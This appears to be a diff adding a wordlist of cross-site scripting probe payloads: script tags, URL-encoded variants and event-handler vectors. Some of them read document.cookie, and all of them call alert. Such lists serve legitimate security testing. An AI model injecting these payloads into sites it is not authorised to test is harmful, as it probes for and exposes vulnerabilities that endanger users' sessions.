@@ -1,0 +1,15 @@
+<script>alert(1)</script>
+<script>alert(document.cookie)</script>
+%3Cscript%3Ealert(1)%3C/script%3E
+%3Cscript%3Ealert(document.cookie)%3C/script%3E
+<img src=x onerror=alert(1)>
+<img src=x onerror=alert(document.cookie)>
+<svg onload=alert(1)>
+<svg onload=alert(document.cookie)>
+<body onload=alert(1)>
+<details open ontoggle=alert(1)>
+<iframe onload=alert(1)>
+<input autofocus onfocus=alert(1)>
+<select autofocus onfocus=alert(1)>
+<textarea autofocus onfocus=alert(1)>
+<keygen autofocus onfocus=alert(1)>
